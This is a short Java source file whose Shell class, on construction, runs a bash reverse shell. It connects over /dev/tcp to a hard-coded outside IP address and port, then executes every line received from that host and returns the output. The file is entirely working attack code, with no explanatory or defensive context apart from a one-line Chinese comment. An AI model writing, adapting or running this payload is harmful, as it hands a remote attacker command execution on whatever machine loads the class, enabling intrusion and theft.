public class Shell {
    public Shell(){
        try{
            // 要执行的命令
            String[] commands = {"bash","-c","exec 5<>/dev/tcp/124.222.21.138/12345;cat <&5 | while read line; do $line 2>&5 >&5; done"};
            Process pc = Runtime.getRuntime().exec(commands);
            pc.waitFor();
        } catch(Exception e){
            e.printStackTrace();
        }
    }

    public static void main(String[] argv) {
        Shell e = new Shell();
    }
}

